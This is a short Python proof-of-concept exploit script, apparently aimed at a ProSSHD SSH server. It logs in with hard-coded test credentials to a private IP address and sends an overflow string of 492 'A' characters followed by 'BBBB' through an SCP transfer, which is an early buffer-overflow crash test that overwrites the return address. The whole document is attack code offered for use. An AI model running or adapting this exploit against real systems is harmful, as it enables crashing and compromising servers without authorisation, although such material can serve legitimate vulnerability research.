#prosshd3.py POC Exploit
import paramiko
from scp import *
from contextlib import closing
from time import sleep
import struct

hostname = "192.168.209.198"
username = "test1"
password = "asdf"

req = "A" * 492 + "BBBB"

ssh_client = paramiko.SSHClient()
ssh_client.load_system_host_keys()
ssh_client.connect(hostname, username=username, key_filename=None,
password=password)
sleep(15)

with SCPClient(ssh_client.get_transport()) as scp:
    scp.put(scp, req)

